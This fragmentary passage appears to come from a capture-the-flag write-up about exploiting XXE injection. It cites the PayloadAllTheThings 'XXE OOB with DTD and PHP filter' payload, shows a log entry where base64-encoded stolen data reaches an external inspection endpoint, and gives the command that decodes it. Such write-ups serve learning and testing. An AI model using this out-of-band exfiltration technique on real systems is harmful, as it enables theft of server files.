...
We can find many different XXE payloads at the [PayloadAllTheThings page](https://github.[AWS_SECRET_REMOVED]e/master/XXE%20injection). The one that worked for me is "**XXE OOB with DTD and PHP filter**":
...
The log shows:
```
GET /inspect/01d0fpjtce5cd5ae80menm0hyw?[AWS_SECRET_REMOVED]ZHNfYV9udXRfbm93X2FuZF90aGVuCg== HTTP/1.1
...
```
# echo [AWS_SECRET_REMOVED]ZHNfYV9udXRfbm93X2FuZF90aGVuCg== | base64 -d
